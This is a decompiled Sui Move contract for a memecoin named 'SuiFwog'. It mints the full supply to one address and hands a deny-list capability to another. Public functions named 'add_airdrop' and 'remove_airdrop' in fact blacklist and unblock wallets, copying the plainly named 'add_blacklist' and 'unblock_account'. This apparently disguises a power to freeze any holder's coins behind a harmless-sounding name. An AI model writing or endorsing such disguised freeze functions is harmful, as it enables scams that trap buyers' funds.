module 0x7a0af024db7ca7cdfe647327c8f9b1ee8ac0fa53cbc2bd5153123bf13d0265bd::suifwog {
    struct SUIFWOG has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<SUIFWOG>, arg1: 0x2::coin::Coin<SUIFWOG>) {
        0x2::coin::burn<SUIFWOG>(arg0, arg1);
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIFWOG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUIFWOG>(arg0, arg1, arg2, arg3);
    }

    entry fun add_blacklist(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIFWOG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUIFWOG>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SUIFWOG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUIFWOG>(arg0, 6, b"SuiFwog", b"Sui Fwog", b"The cute and lovely Fwog is coming to Sui forest.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://silver-urgent-porpoise-620.mypinata.cloud/ipfs/QmUdManBrmZ5ZFGSMyp58F1funcESweTQHoEgLJnRVuTmr"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SUIFWOG>(&mut v3, 10000000000000000, @0xc365755a2a0701b681114d4307ddba3fc81c5727ed2a0b63fb9617cd9342ee2a, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUIFWOG>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SUIFWOG>>(v3, @0x0);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUIFWOG>>(v1, @0xf85514e8190792bf118bcf0c6c908518b4f4f6fdab7511c45a517b6659329f4f);
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIFWOG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SUIFWOG>(arg0, arg1, arg2, arg3);
    }

    entry fun unblock_account(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIFWOG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SUIFWOG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

